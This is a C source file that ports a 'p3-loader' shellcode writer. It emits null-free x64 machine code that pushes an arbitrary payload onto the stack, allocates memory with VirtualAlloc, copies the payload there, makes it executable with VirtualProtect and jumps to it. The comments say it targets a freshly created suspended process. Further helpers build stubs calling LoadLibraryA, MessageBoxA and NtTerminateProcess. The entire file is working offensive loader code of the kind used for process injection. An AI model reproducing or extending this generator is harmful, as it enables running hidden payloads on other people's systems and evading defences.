/* ════════════════════════════════════════════════════════════════════
 * shellwriter.c
 * C port of original p3-loader's ShellCodeWriter.cpp
 *
 * Generates a null-free shellcode stub from an arbitrary payload.
 * Crystal Palace PIC-safe: no CRT, no globals, no switch, no stdlib.
 *
 * ════════════════════════════════════════════════════════════════════ */
#include "shellwriter.h"

/* ── Lifecycle ─────────────────────────────────────────────────────── */

void scw_init(SCW *w, u8 *buf, int cap)
{
    w->buf         = buf;
    w->len         = 0;
    w->cap         = cap;
    w->stack_bytes = 0;
}

/* ── Raw emission ──────────────────────────────────────────────────── */

void scw_append(SCW *w, const u8 *b, int n)
{
    int i;
    for (i = 0; i < n; i++)
        if (w->len < w->cap)
            w->buf[w->len++] = b[i];
}

int scw_check_nulls(const SCW *w)
{
    int i;
    for (i = 0; i < w->len; i++)
        if (w->buf[i] == 0)
            return i;
    return -1;
}

/* ── SetRAX / SetRAXXOR ─────────────────────────────────────────────
 * Exact port of p3-loader Listing 10.
 *
 * value == 0:  xor rax, rax  (48 31 C0, 3 bytes)
 * else:        mov rax, XA   (48 B8 + 8 LE bytes)
 *              mov r15, XB   (49 BF + 8 LE bytes)
 *              xor rax, r15  (4C 31 F8)
 *              = 23 bytes, zero null bytes guaranteed.
 *
 * XB starts as 0x0101010101010101.
 * For each byte i where value[i]==0x01 → XB[i]=0x02
 * so XA[i] = value[i]^XB[i] = 0x01^0x02 = 0x03 (never 0x00).
 * For value[i]==0x00 → XA[i] = 0x00^0x01 = 0x01 (never 0x00).
 * ─────────────────────────────────────────────────────────────────── */
void scw_set_rax(SCW *w, u64 value)
{
    u8 b[10];
    int i;

    if (value == 0) {
        b[0]=0x48; b[1]=0x31; b[2]=0xC0;  /* xor rax, rax */
        scw_append(w, b, 3);
        return;
    }

    {
        u64 xb = 0x0101010101010101ULL;
        for (i = 0; i < 8; i++)
            if (((u8 *)&value)[i] == 0x01)
                ((u8 *)&xb)[i] = 0x02;
        u64 xa = value ^ xb;

        /* mov rax, xa  →  48 B8 [xa LE] */
        b[0]=0x48; b[1]=0xB8;
        b[2]=(u8)xa;        b[3]=(u8)(xa>>8);
        b[4]=(u8)(xa>>16);  b[5]=(u8)(xa>>24);
        b[6]=(u8)(xa>>32);  b[7]=(u8)(xa>>40);
        b[8]=(u8)(xa>>48);  b[9]=(u8)(xa>>56);
        scw_append(w, b, 10);

        /* mov r15, xb  →  49 BF [xb LE] */
        b[0]=0x49; b[1]=0xBF;
        b[2]=(u8)xb;        b[3]=(u8)(xb>>8);
        b[4]=(u8)(xb>>16);  b[5]=(u8)(xb>>24);
        b[6]=(u8)(xb>>32);  b[7]=(u8)(xb>>40);
        b[8]=(u8)(xb>>48);  b[9]=(u8)(xb>>56);
        scw_append(w, b, 10);
    }

    /* xor rax, r15  →  4C 31 F8 */
    b[0]=0x4C; b[1]=0x31; b[2]=0xF8;
    scw_append(w, b, 3);
}

/* ── PushValue ──────────────────────────────────────────────────────
 * set_rax(value) + push rax (0x50).  stack_bytes += 8.             */
void scw_push_value(SCW *w, u64 value)
{
    u8 push_rax = 0x50;
    scw_set_rax(w, value);
    scw_append(w, &push_rax, 1);
    w->stack_bytes += 8;
}

/* ── PushBuffer ─────────────────────────────────────────────────────
 * Push `len` bytes so that rsp → data[0] after all pushes.
 *
 * Pads to multiple of 8.  Iterates from last chunk to first (reversed)
 * so the first chunk lands at the lowest address (rsp).
 *
 * Null bytes inside chunks appear ONLY at runtime in the target stack
 * — never in the emitted shellcode bytes (set_rax encodes them).
 * ─────────────────────────────────────────────────────────────────── */
void scw_push_buffer(SCW *w, const u8 *data, int len)
{
    int padded = (len + 7) & ~7;
    int i, j;
    for (i = padded - 8; i >= 0; i -= 8) {
        u64 val = 0;
        for (j = 0; j < 8; j++)
            if (i + j < len)
                ((u8 *)&val)[j] = data[i + j];
        scw_push_value(w, val);
    }
}

/* ── Internal: mov arg_reg, rax ─────────────────────────────────────
 *  0 (RCX): 48 89 C1
 *  1 (RDX): 48 89 C2
 *  2 (R8):  49 89 C0
 *  3 (R9):  49 89 C1
 * ─────────────────────────────────────────────────────────────────── */
static void _mov_arg_rax(SCW *w, int reg)
{
    u8 b[3];
    if      (reg == 0) { b[0]=0x48; b[1]=0x89; b[2]=0xC1; }
    else if (reg == 1) { b[0]=0x48; b[1]=0x89; b[2]=0xC2; }
    else if (reg == 2) { b[0]=0x49; b[1]=0x89; b[2]=0xC0; }
    else               { b[0]=0x49; b[1]=0x89; b[2]=0xC1; }
    scw_append(w, b, 3);
}

/* ── SetArgRegister ────────────────────────────────────────────────
 * arg_reg = value (any u64, null-free).                             */
void scw_set_arg(SCW *w, int reg, u64 value)
{
    scw_set_rax(w, value);
    _mov_arg_rax(w, reg);
}

/* ── SetArgRegisterStackRelative ────────────────────────────────────
 * arg_reg = RSP + offset.
 * Emits: set_rax(offset); add rax,rsp (48 01 E0); mov reg,rax
 * Call BEFORE scw_call so RSP reflects the correct frame depth.     */
void scw_set_arg_sp(SCW *w, int reg, int offset)
{
    u8 add_rax_rsp[3];
    add_rax_rsp[0]=0x48; add_rax_rsp[1]=0x01; add_rax_rsp[2]=0xE0;
    scw_set_rax(w, (u64)offset);
    scw_append(w, add_rax_rsp, 3);
    _mov_arg_rax(w, reg);
}

/* ── Call ───────────────────────────────────────────────────────────
 * Exact port of p3-loader's Call().
 *
 * Aligns RSP to 16 bytes if needed (assumes initial RSP = 16-byte
 * aligned at shellcode entry, which holds for a freshly created
 * suspended process before its first instruction executes).
 *
 * If stack_bytes % 16 != 0:  emit sub rsp,8  (stack_bytes += 8)
 *   → stack_bytes is now divisible by 16.
 *   → second check never fires (0 % 16 == 0).
 *   → the 8-byte alignment is PERMANENTLY consumed.
 *
 * This matches p3-loader exactly: alignment bytes stay consumed so
 * all subsequent set_arg_sp() offset calculations remain correct.
 * ─────────────────────────────────────────────────────────────────── */
void scw_call(SCW *w, u64 addr)
{
    u8 sub8[4]; sub8[0]=0x48; sub8[1]=0x83; sub8[2]=0xEC; sub8[3]=0x08;
    u8 add8[4]; add8[0]=0x48; add8[1]=0x83; add8[2]=0xC4; add8[3]=0x08;

    if (w->stack_bytes % 16) {
        scw_append(w, sub8, 4);
        w->stack_bytes += 8;
    }

    scw_set_rax(w, addr);
    { u8 b[2]; b[0]=0xFF; b[1]=0xD0; scw_append(w, b, 2); } /* call rax */

    /* Second check: only fires if alignment was NOT needed (no-op case).
     * Mirrors p3-loader's second `if` exactly.                        */
    if (w->stack_bytes % 16) {
        scw_append(w, add8, 4);
        w->stack_bytes -= 8;
    }
}

/* ════════════════════════════════════════════════════════════════════
 *  HIGH-LEVEL EMITTERS
 * ════════════════════════════════════════════════════════════════════ */

/* ── LoadAndCallShellCode ───────────────────────────────────────────
 * PRIMARY FUNCTION — exact port of p3-loader Listings 14+15.
 *
 * Generated stub layout (in target process memory at runtime):
 *
 *   rsp + shadow + align : shellcode bytes (pushed null-free)
 *   rsp + 0 .. +31       : Win64 shadow space (shared by both calls)
 *   rsp - 0 or -8        : alignment pad (if stack_bytes was odd×8)
 *
 * Register usage in the emitted copy loop:
 *   rcx  = source pointer (shellcode on stack)
 *   r10  = dest pointer   (VirtualAlloc result)
 *   r11  = byte counter   (sc_len)
 *   r12  = dest base      (preserved across VirtualProtect call, used for jmp)
 *
 * Note on shadow space: allocated ONCE (sub rsp, 32).  Both the
 * VirtualAlloc call and the VirtualProtect call reuse it — identical
 * to p3-loader.  The lpflOldProtect arg (r9) points into the shellcode
 * copy on the stack as scratch; that copy was already transferred.
 * ─────────────────────────────────────────────────────────────────── */
void scw_load_and_call(SCW *w,
                       u64 virtual_alloc,
                       u64 virtual_protect,
                       const u8 *sc, int sc_len)
{
    /* ── 1. Push shellcode bytes onto stack (null-free encoded) ─── */
    scw_push_buffer(w, sc, sc_len);
    int pos_sc = w->stack_bytes;   /* position AFTER push, BEFORE shadow */

    /* ── 2a. Shadow space (shared by both calls) ────────────────── */
    { u8 b[4]; b[0]=0x48; b[1]=0x83; b[2]=0xEC; b[3]=0x20;
      scw_append(w, b, 4); }
    w->stack_bytes += 32;

    /* ── 2b. VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_READWRITE) */
    /* MEM_COMMIT = 0x1000, PAGE_READWRITE = 0x04                    */
    scw_set_arg(w, 0, 0);            /* rcx = NULL (lpAddress)       */
    scw_set_arg(w, 1, (u64)sc_len);  /* rdx = sc_len                 */
    scw_set_arg(w, 2, 0x1000);       /* r8  = MEM_COMMIT             */
    scw_set_arg(w, 3, 0x04);         /* r9  = PAGE_READWRITE         */
    scw_call(w, virtual_alloc);
    /* rax = RW allocation in target */

    /* ── 3. Save dest pointer ─────────────────────────────────────
     * mov r12, rax  (49 89 C4) — destination base, kept for jmp
     * mov r10, rax  (49 89 C2) — walking dest pointer for copy loop */
    { u8 b[3]; b[0]=0x49; b[1]=0x89; b[2]=0xC4; scw_append(w, b, 3); }
    { u8 b[3]; b[0]=0x49; b[1]=0x89; b[2]=0xC2; scw_append(w, b, 3); }

    /* r11 = sc_len  (byte counter)
     * set_rax(sc_len)  +  mov r11, rax  (49 89 C3)                  */
    scw_set_rax(w, (u64)sc_len);
    { u8 b[3]; b[0]=0x49; b[1]=0x89; b[2]=0xC3; scw_append(w, b, 3); }

    /* rcx = rsp + (stack_bytes - pos_sc)  →  pointer to shellcode   */
    scw_set_arg_sp(w, 0, w->stack_bytes - pos_sc);

    /* ── 3b. Byte copy loop  (all opcodes verified null-free) ──────
     *   8A 01        mov al, [rcx]
     *   41 88 02     mov [r10], al
     *   48 FF C1     inc rcx
     *   49 FF C2     inc r10
     *   49 FF CB     dec r11
     *   75 F0        jnz -16        ← loops back to mov al,[rcx]
     * Total: 16 bytes.  jnz rel8 = F0 = -16 (signed) → target = ip+2-16 ✓ */
    {
        u8 loop[16];
        loop[0]=0x8A; loop[1]=0x01;
        loop[2]=0x41; loop[3]=0x88; loop[4]=0x02;
        loop[5]=0x48; loop[6]=0xFF; loop[7]=0xC1;
        loop[8]=0x49; loop[9]=0xFF; loop[10]=0xC2;
        loop[11]=0x49; loop[12]=0xFF; loop[13]=0xCB;
        loop[14]=0x75; loop[15]=0xF0;
        scw_append(w, loop, 16);
    }

    /* ── 4. VirtualProtect(r12, sc_len, PAGE_EXECUTE_READ, stack_ptr)
     * Reuse the shadow space allocated in step 2a.
     * PAGE_EXECUTE_READ = 0x20
     * r9 = rsp + offset  →  shellcode-on-stack used as lpflOldProtect
     *   scratch (already copied; overwrite is harmless).             */

    /* mov rcx, r12  (4C 89 E1) */
    { u8 b[3]; b[0]=0x4C; b[1]=0x89; b[2]=0xE1; scw_append(w, b, 3); }

    scw_set_arg(w, 1, (u64)sc_len);  /* rdx = sc_len                 */
    scw_set_arg(w, 2, 0x20);         /* r8  = PAGE_EXECUTE_READ       */

    /* r9 = rsp + (stack_bytes - pos_sc) — same offset as copy loop  */
    scw_set_arg_sp(w, 3, w->stack_bytes - pos_sc);

    scw_call(w, virtual_protect);

    /* ── 5. Align stack for jmp (= p3-loader Listing 15 step 5) ────
     * If stack_bytes is still an odd multiple of 8, sub rsp by 8
     * using: pop rax; push rax; push rax  (58 50 50, 3 bytes, no nulls)
     * This matches p3-loader's alignment snippet exactly.            */
    if (w->stack_bytes % 16) {
        u8 b[3]; b[0]=0x58; b[1]=0x50; b[2]=0x50;
        scw_append(w, b, 3);
        w->stack_bytes += 8;
    }

    /* ── 6. jmp r12  (41 FF E4) ────────────────────────────────── */
    { u8 b[3]; b[0]=0x41; b[1]=0xFF; b[2]=0xE4; scw_append(w, b, 3); }
}

/* ── CallLoadLibraryA ───────────────────────────────────────────────
 * Exact port of p3-loader Listing 13.
 *
 * 1. Push dll_name bytes onto stack (null-free encoding).
 * 2. pos_buf = stack_bytes  (position AFTER push, BEFORE shadow).
 * 3. sub rsp, 32  (shadow space).
 * 4. rcx = rsp + (stack_bytes - pos_buf)  → pointer to dll_name.
 * 5. Call LoadLibraryA.
 * ─────────────────────────────────────────────────────────────────── */
void scw_call_loadlib(SCW *w, u64 loadlibrary_a, const char *dll_name)
{
    int len = 0;
    while (dll_name[len]) len++;
    len++;  /* include null terminator (pushed null-free at runtime) */

    scw_push_buffer(w, (const u8 *)dll_name, len);
    int pos_buf = w->stack_bytes;

    /* shadow space: sub rsp, 32 */
    { u8 b[4]; b[0]=0x48; b[1]=0x83; b[2]=0xEC; b[3]=0x20;
      scw_append(w, b, 4); }
    w->stack_bytes += 32;

    /* rcx = rsp + (stack_bytes - pos_buf) → dll_name on stack       */
    scw_set_arg_sp(w, 0, w->stack_bytes - pos_buf);

    scw_call(w, loadlibrary_a);
}

/* ── CallMessageBoxA ────────────────────────────────────────────────
 * MessageBoxA(NULL, text, caption, type).
 *
 * Stack layout after push+shadow:
 *   rsp + (stack_bytes-pos_text)    → text string
 *   rsp + (stack_bytes-pos_caption) → caption string
 * ─────────────────────────────────────────────────────────────────── */
void scw_call_msgbox(SCW *w, u64 messagebox_a,
                     const char *text, const char *caption, u32 type)
{
    int tlen = 0, clen = 0;
    while (text[tlen])    tlen++;
    tlen++;
    while (caption[clen]) clen++;
    clen++;

    /* Push caption first (lands higher on stack = larger rsp offset)  */
    scw_push_buffer(w, (const u8 *)caption, clen);
    int pos_caption = w->stack_bytes;

    scw_push_buffer(w, (const u8 *)text, tlen);
    int pos_text = w->stack_bytes;

    /* shadow space */
    { u8 b[4]; b[0]=0x48; b[1]=0x83; b[2]=0xEC; b[3]=0x20;
      scw_append(w, b, 4); }
    w->stack_bytes += 32;

    scw_set_arg(w, 0, 0);                                   /* rcx = NULL        */
    scw_set_arg_sp(w, 1, w->stack_bytes - pos_text);        /* rdx = &text[0]    */
    scw_set_arg_sp(w, 2, w->stack_bytes - pos_caption);     /* r8  = &caption[0] */
    scw_set_arg(w, 3, (u64)type);                           /* r9  = type        */

    scw_call(w, messagebox_a);
}

/* ── CallTerminateProcess ───────────────────────────────────────────
 * Exact port of p3-loader Listing 12.
 * No shadow space here (matches p3-loader; NT stubs don't use it).
 * NtCurrentProcess pseudo-handle = 0xFFFFFFFFFFFFFFFF.              */
void scw_call_terminate(SCW *w, u64 nt_terminate,
                        u64 handle, u32 exit_status)
{
    scw_set_arg(w, 0, handle);
    scw_set_arg(w, 1, (u64)exit_status);
    scw_call(w, nt_terminate);
}